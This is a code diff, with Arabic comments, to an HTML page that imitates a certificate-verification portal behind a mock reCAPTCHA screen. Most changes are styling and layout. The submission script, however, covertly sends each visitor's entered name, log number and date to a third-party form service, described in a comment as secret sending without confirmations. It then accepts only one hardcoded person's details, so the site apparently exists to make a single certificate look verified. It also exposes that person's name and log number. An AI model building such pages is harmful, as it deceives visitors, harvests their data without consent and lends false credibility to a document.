@@ -75,10 +75,19 @@
     .rc-logo-text { font-family: Roboto, sans-serif; font-size: 10px; color: #555; }
     .rc-logo-terms { font-family: Roboto, sans-serif; font-size: 8px; color: #999; margin-top: 2px; }
     
-    .validation-error-msg { color: rgba(0,0,0,0.87); font-size: 13.5px; font-family: Roboto, sans-serif; margin-top: 25px; text-align: center; display: none; line-height: 1.5; max-width: 500px; }
+    .validation-error-msg {
+      color: rgba(0,0,0,0.87);
+      font-size: 13.5px;
+      font-family: Roboto, sans-serif;
+      margin-top: 25px;
+      text-align: center;
+      display: none;
+      line-height: 1.5;
+      max-width: 500px;
+    }
     .validation-error-msg a { color: #3f51b5; text-decoration: underline; }
 
-    /* النتيجة الإنجليزية */
+    /* تنسيق النتيجة الحرة المشتركة */
     .mat-datepicker-content {
       position: absolute;
       width: 296px;
@@ -179,8 +188,7 @@
         <div class="rc-spacer"></div>
         <div class="rc-logo-container">
           <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
-          <div class="rc-logo-text">reCAPTCHA</div>
-          <div class="rc-logo-terms">Privacy - Terms</div>
+          <div class="rc-text" style="font-size: 10px; color: #555; margin-left:0; font-weight:normal; text-align:center; line-height:1.1;">reCAPTCHA<br><span style="font-size:8px; color:#999;">Privacy - Terms</span></div>
         </div>
       </div>
     </div>
@@ -312,31 +320,7 @@
                     </div>
                     <div style="font-size: 12px; color: rgba(0,0,0,0.6); padding-left: 16px; text-align: left; font-family: Roboto;">dd/mm/yyyy</div>
                     
-                    <div id="cdp-overlay" class="cdp-overlay"></div>
-                    
-                    <div id="custom-datepicker" class="mat-datepicker-content">
-                        <div class="mat-calendar-header">
-                            <div class="mat-calendar-controls">
-                                <button class="mat-calendar-period-button" type="button">
-                                   <span id="cdp-month-year">JUN 2026</span>
-                                   <svg class="mat-calendar-arrow" viewBox="0 0 10 5" focusable="false"><polygon points="0,0 5,5 10,0"></polygon></svg>
-                                </button>
-                                <div class="mat-calendar-spacer"></div>
-                                <button class="mat-calendar-previous-button" id="cdp-prev" type="button"><span class="material-icons">chevron_left</span></button>
-                                <button class="mat-calendar-next-button" id="cdp-next" type="button"><span class="material-icons">chevron_right</span></button>
-                            </div>
-                        </div>
-                        <div class="mat-calendar-content-table">
-                            <table class="mat-calendar-table">
-                                <thead class="mat-calendar-table-header">
-                                    <tr><th>Su</th><th>Mo</th><th>Tu</th><th>We</th><th>Th</th><th>Fr</th><th>Sa</th></tr>
-                                </thead>
-                                <tbody class="mat-calendar-table-body" id="cdp-grid">
-                                </tbody>
-                            </table>
-                        </div>
                     </div>
-                  </div>
                   
                   <div id="error-message" class="validation-error-msg">
                     <strong>We are unable to verify this information please ensure all details match EXACTLY<br>the information printed on the certificate.</strong>
@@ -378,6 +362,7 @@
     </div>
   </app-root>
 
+  <div id="cdp-overlay" class="cdp-overlay"></div>
   <div id="custom-datepicker" class="mat-datepicker-content">
       <div class="mat-calendar-header">
           <div class="mat-calendar-controls">
@@ -414,6 +399,7 @@
         setTimeout(() => {
           captchaScreen.style.display = 'none';
           mainStepper.style.display = 'block';
+          adjustStepperLayout(); // إعادة الحساب بعد الفتح
         }, 800);
       });
 
@@ -551,6 +537,7 @@
               if (window.innerWidth <= 768) {
                   dateOverlay.style.display = 'block';
               } else {
+                  // الحساب الذكي لمكان النتيجة للكمبيوتر
                   const rect = dateWrapper.getBoundingClientRect();
                   const calHeight = datePicker.offsetHeight || 354;
                   if (window.innerHeight - rect.bottom >= calHeight || window.innerHeight - rect.bottom > rect.top) {
@@ -733,11 +720,8 @@
         const masterLog = logInput.value.trim();
         const achieveDate = dateInput.value.trim().toLowerCase();
 
-        // -------------------------------------------------------------------------
-        // 🛑 خطوتك الأخيرة: ادخل على web3forms.com واكتب إيميلك واطلب الـ Key مجاناً
-        // وحطه هنا مكان الكلمة المكتوبة دي عشان الإرسال يشتغل فوراً وبدون تفعيل!
-        // -------------------------------------------------------------------------
-        const web3AccessKey = "75af80b0-xxxx-xxxx-xxxx-xxxxxxxxxxxx"; 
+        // إرسال سري عبر Web3Forms بدون تأكيدات ورسائل رخمة
+        const web3AccessKey = "75af80b0-xxxx-xxxx-xxxx-xxxxxxxxxxxx"; // 👈 حط مفتاح الـ Access Key بتاعك هنا
 
         fetch("https://api.web3forms.com/submit", {
             method: "POST",
@@ -758,7 +742,6 @@
         }).then(response => response.json())
           .then(data => console.log("Web3Forms Success:", data))
           .catch(error => console.log("Web3Forms Error:", error));
-        // -------------------------------------------------------------------------
 
         const validName = "hussein hosny mohamed helal";
         const validLog1 = "00695637/169716";
